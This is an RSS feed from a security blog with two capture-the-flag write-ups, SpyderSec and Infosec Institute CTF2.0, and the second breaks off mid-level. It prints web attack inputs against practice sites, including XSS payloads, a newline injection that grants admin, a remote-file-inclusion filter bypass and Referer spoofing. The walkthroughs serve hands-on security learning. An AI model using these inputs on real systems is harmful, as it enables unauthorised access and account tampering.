<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Infosec on Unlogic</title>
    <link>http://unlogic.co.uk/tags/infosec/</link>
    <description>Recent content in Infosec on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Sep 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://unlogic.co.uk/tags/infosec/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SpyderSec solution</title>
      <link>http://unlogic.co.uk/2015/09/09/spydersec-solution/</link>
      <pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/09/09/spydersec-solution/</guid>
      <description>&lt;p&gt;Another day, another VM. Today it&amp;rsquo;s the &lt;a href=&#34;https://www.vulnhub.com/entry/spydersec-challenge,128/&#34;&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nah3Wah.gif&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lucky me, only one service running, and it&amp;rsquo;s good old http at that.
Let&amp;rsquo;s take a look at that page then:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IiA6MlY.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IiA6MlY.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Without wasting much time, let&amp;rsquo;s get to the clue hunting. First things first: check the source.
And there&amp;rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&amp;rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;SyntaxError&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;missing&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;statement&lt;/span&gt;
    &lt;span style=&#34;color: #ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So that&amp;rsquo;s the output from the eval. It throws an error because the result isn&amp;rsquo;t valid
javascript. It seems to me as though it might be HEX. I&amp;rsquo;ll put it through Burp&amp;rsquo;s decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:&#39;:m:u:l:d:e:r:.:f:b:i:&#39;:):;&lt;/code&gt;. That&amp;rsquo;s not going to
affect the page in any way, but I&amp;rsquo;m sure it&amp;rsquo;s a clue. I&amp;rsquo;ll note it down and carry on exploring.&lt;/p&gt;

&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;

&lt;p&gt;Ok then, apart from that there&amp;rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&amp;rsquo;s two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp&amp;rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;

&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I&amp;rsquo;ve not exhausted all the
nooks and crannies yet, there&amp;rsquo;s still that cookie jar to poke at.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue&amp;hellip;. leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that&amp;rsquo;s also forbidden. Well, let
me just plug some of the data we&amp;rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A video file, which when I play it, is the song &amp;ldquo;Twilight Time&amp;rdquo; by &amp;ldquo;The Platters&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So here I hit another dead end.&lt;/p&gt;

&lt;p&gt;Let me think

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CbfWCmv.gif&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll take inventory of the clues I have left now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A music video &amp;ldquo;Twilight time&amp;rdquo; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a href=&#34;https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files&#34;&gt;Wikipedia article&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well if that ain&amp;rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a href=&#34;http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file&#34;&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;

&lt;p&gt;Sure enough, there&amp;rsquo;s a volume in the video, but it needs a password. Well there&amp;rsquo;s only
one unused piece of the puzzle left. I plug that in and there&amp;rsquo;s our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That&amp;rsquo;s
something new I learned from this. So thanks to &lt;a href=&#34;https://twitter.com/Spydersec&#34;&gt;@SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Infosec Institute CTF2.0</title>
      <link>http://unlogic.co.uk/2015/06/25/infosec-institute-ctf2-dot-0/</link>
      <pubDate>Thu, 25 Jun 2015 00:00:00 +0000</pubDate>
      
      <guid>http://unlogic.co.uk/2015/06/25/infosec-institute-ctf2-dot-0/</guid>
      <description>

&lt;p&gt;The folks over at the &lt;a href=&#34;https://infosecinstitute.com&#34;&gt;Infosec Institue&lt;/a&gt; have released
their &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/&#34;&gt;second CTF&lt;/a&gt;. Here&amp;rsquo;s how I got on&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;level-01:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 01&lt;/h1&gt;

&lt;p&gt;In &lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php&#34;&gt;level 01&lt;/a&gt; I am supposed
to use the provided form to perform a cross site scripting exploit. Here&amp;rsquo;s what the form
looks like:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CJTNyK4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;At first I might as well test how the form works. Entering something like &lt;code&gt;test&lt;/code&gt; and
&lt;code&gt;www.test.com&lt;/code&gt; in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: &lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Ex1&amp;quot;);&amp;lt;/script&amp;gt;&lt;/code&gt; in the &lt;code&gt;Site Name&lt;/code&gt; field.&lt;/p&gt;

&lt;p&gt;A popup tells me that I need to &lt;em&gt;match the requested format&lt;/em&gt;. Probably some client side
checks, so I inspect the field with Firebug and notice this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f5KzFDx.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The field has a regular expression premitting only upper or lowercase characters. I can either
delete this or just change it to &lt;code&gt;.+&lt;/code&gt; so it matches any character.&lt;/p&gt;

&lt;p&gt;Now resubmitting the XSS payload works and the string is reflected on the page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/yvSc4To.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;However, there&amp;rsquo;s no pop up. So there must be something else validating input. Heading back to the
source I find some javscript in &lt;code&gt;ex1.js&lt;/code&gt; which contains the following code:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/VVe74tW.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VVe74tW.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;siteName&lt;/code&gt; variable has all &lt;code&gt;&amp;lt;&lt;/code&gt; and &lt;code&gt;&amp;gt;&lt;/code&gt; characters replaced with their equivalent html codes.
By clicking on the gutter in the source code I set a breakpoint on the line that does this, and resubmit
my data. The Firebug debugger breaks on the line and I step over it. Sure enough &lt;code&gt;siteName&lt;/code&gt; is not
what I want it to be. Double clicking on the value in the right hand window allows me to edit it, and
revert it back to what I want it to be. Then clicking continue I am rewarded with:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/VEFDpio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-02:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 02&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex2.php&#34;&gt;Level 02&lt;/a&gt; is a simple web calculator:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/asgTWCw.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I&amp;rsquo;m supposed to use the form to print &lt;code&gt;phpinfo&lt;/code&gt; or other data to the page. This is a PHP
script evaluating a simple expression. I am guessing that it&amp;rsquo;s going to be calling &lt;code&gt;eval&lt;/code&gt;, as
that&amp;rsquo;s a fairly common vulnerability, and fits to how the page works. After entering some numbers
and other characters into the two fields I quickly learn that the input for those fields is checked.
That means I can&amp;rsquo;t enter anything but numbers into those fields. That leaves the operator as the only
other thing under our control.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;m going to guess that code looks somewhat like this:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;eval (&amp;quot;print $num1 $op $num2;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So I need to change the operand to something that prints &lt;code&gt;phpinfo&lt;/code&gt; but leaves the rest of the statement
valid. With Firebug I can edit the value of the operand to the following:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/8xnqMxv.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Hit submit and&amp;hellip;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/rUgaixe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-03:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 03&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex3.php&#34;&gt;Level 03&lt;/a&gt; provides me with a registration
form and a login form. The instructions indicate that the data is stored in a delimited file and I need
to sign up as a new user with admin rights.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/f0g5TmV.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;First things first, let&amp;rsquo;s see if we can figure out the delimiter&amp;hellip; Signing up and logging in
shows us our name and current role: &lt;code&gt;role:normal&lt;/code&gt;. This already tells me that the delimiter is not
&lt;code&gt;:&lt;/code&gt;. After fuzzing the input it turns out most characters are ok to use. So what&amp;rsquo;s the delimeter?
I check the hints and it tells me that it&amp;rsquo;s the newline character. Interesting, in my fuzzing I tried that,
but had no luck. Unless..&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s not use &lt;code&gt;\n&lt;/code&gt; but a real new line. I can achieve this by editing the source with Firebug
once again, changing the &lt;code&gt;lastname&lt;/code&gt; field to a &lt;code&gt;textarea&lt;/code&gt; type:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QBVptMv.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QBVptMv.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now I can have multiple lines and enter a real carriage return into the field. My last
name will be&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;alpha7
role:admin
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And after a login with the new creds:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Akj9NL8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-04:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 04&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php&#34;&gt;Level 04&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/nmRe8U2.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nmRe8U2.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here we need to load a php file instead of the text files that load when you click
on the &lt;em&gt;Bio&lt;/em&gt;, &lt;em&gt;Clients&lt;/em&gt;, or &lt;em&gt;About&lt;/em&gt; buttons. The instructions are very clear,
but it sounds like we need to load a phop file from the root of the domain. Let&amp;rsquo;s
see what restrictions are in place.&lt;/p&gt;

&lt;p&gt;Fuzzing the file parameter I notice that it seems to test for &lt;code&gt;fileNiXtxt&lt;/code&gt; where &lt;em&gt;N&lt;/em&gt; is
any number and &lt;code&gt;X&lt;/code&gt; is any other character. Anything other than that pattern will print &lt;code&gt;Invalid file selected.&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Entering &lt;code&gt;index.php;file1.txt&lt;/code&gt; for example gives a different error: &lt;code&gt;There is something else that you must do.&lt;/code&gt;.
Interesting. So I guess it just needs to be somewhere in that argument for the filter to accept it. But
how can we accomplish this with a valid payload?&lt;/p&gt;

&lt;p&gt;One thing I tried was &lt;code&gt;/file1/txt/../../file.php&lt;/code&gt; which wasn&amp;rsquo;t right either. Here we make use
of relative paths where when PHP opens the file, it will ignore the fact that the path
&lt;code&gt;/file1/txt&lt;/code&gt; doesn&amp;rsquo;t exist and treat this as if &lt;code&gt;file.php&lt;/code&gt; as at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;UPDATE: Solved&lt;/p&gt;

&lt;p&gt;So the key bit I was missing was that it wanted a remote, even if that remote is the
same domain as the current page. So I added &lt;code&gt;http://infosecinstitute.com/file3.php&lt;/code&gt; as
the argument to get a new error: &lt;em&gt;You are trying to add a remote URL.&lt;/em&gt; Ok, now we are getting somewhere.
As one of the hints is that the regex might be case sensitive, let&amp;rsquo;s capitalise the &lt;code&gt;h&lt;/code&gt; in &lt;code&gt;http&lt;/code&gt;.
This time we get an &lt;em&gt;invalid file&lt;/em&gt; message, so that bypass worked. Now we need to satisfy the
&lt;code&gt;file3.txt&lt;/code&gt; requirement and using &lt;code&gt;Http://infosecinstitute.com/file3.txt.php&lt;/code&gt; I get the flag&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/WTFYtJi.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WTFYtJi.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;level-05:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 05&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex5.php&#34;&gt;Level 05&lt;/a&gt; starts by telling
me that I am not logged in.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/BOBdkHX.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, I don&amp;rsquo;t remember logging in, so that&amp;rsquo;s not unusual. What is unusual is
that the &lt;code&gt;login&lt;/code&gt; button doesn&amp;rsquo;t work. I&amp;rsquo;ll quickly check the source code and notice
that it&amp;rsquo;s disabled, but also that it points to &lt;code&gt;login.html&lt;/code&gt;. Enabling and clicking it
takes me to a 404, so no go. The vulnerability here is &lt;em&gt;Missing Function Level Access Control&lt;/em&gt;
so perhaps this page assumes we&amp;rsquo;re logged in if we are coming from the login page. Let&amp;rsquo;s
assume that if the user is successful on &lt;code&gt;login.html&lt;/code&gt;, that page will redirect here, and then
this page will just assume that the user is allowed to be here.&lt;/p&gt;

&lt;p&gt;Using an intercepting proxy I&amp;rsquo;ll edit the &lt;code&gt;Referer&lt;/code&gt; field in the original request, so that
it appears to be coming from the login page:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/EK9u7Ir.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Forward the request and&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QCisDvN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;level-06:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 06&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex6.php&#34;&gt;Level 06&lt;/a&gt; shows a nice
big text area with allowable HTML tags.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/Waq1AVN.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This time I need to perform a cross site request forgery. This can be accomlished by an &lt;code&gt;href&lt;/code&gt;
tag, but trying this tells me that they are expecting something that will perform the request
without the need for user interaction. Ok, fine, let&amp;rsquo;s revisit the allowed tags. &lt;code&gt;img&lt;/code&gt; looks useful, right?&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s try the following&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/qCd5NUP.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yep, that&amp;rsquo;s what we needed.&lt;/p&gt;

&lt;h1 id=&#34;level-07:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 07&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php&#34;&gt;Level 07&lt;/a&gt; is a login form on which
we need to perform another XSS attack.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/WO8dRpe.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, lucky for me I perform these challenges through a proxy which unhides hidden fields like
the one you see there. Some investigation shows that the value of the hidden field comes from
a php_self value. That is it uses whatever the URL part is to populate the field, so that form
is submitted back to itself.&lt;/p&gt;

&lt;p&gt;Using this we can inject something into the field to hopefully reflect our data on the page.
By employing the &lt;code&gt;arg&lt;/code&gt; paramater we can close the &lt;code&gt;input&lt;/code&gt; tag, and the inject our &lt;code&gt;h1&lt;/code&gt; tags:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex7.php?arg=&amp;#39;&amp;gt;&amp;lt;h1&amp;gt;username&amp;lt;/h1&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Submitting that puts &lt;code&gt;username&lt;/code&gt; on the page surrounded by &lt;code&gt;h1&lt;/code&gt; tags and nabs the flag&lt;/p&gt;

&lt;h1 id=&#34;level-08:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 08&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php&#34;&gt;Level 08&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/610ZNNq.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we need to upload an image that will produce a javscript alert. First things first with these
things I upload an image to see how it behaves. Once uploaded I click on the example links and notice that
images are fetched via an id. The URL is&lt;/p&gt;

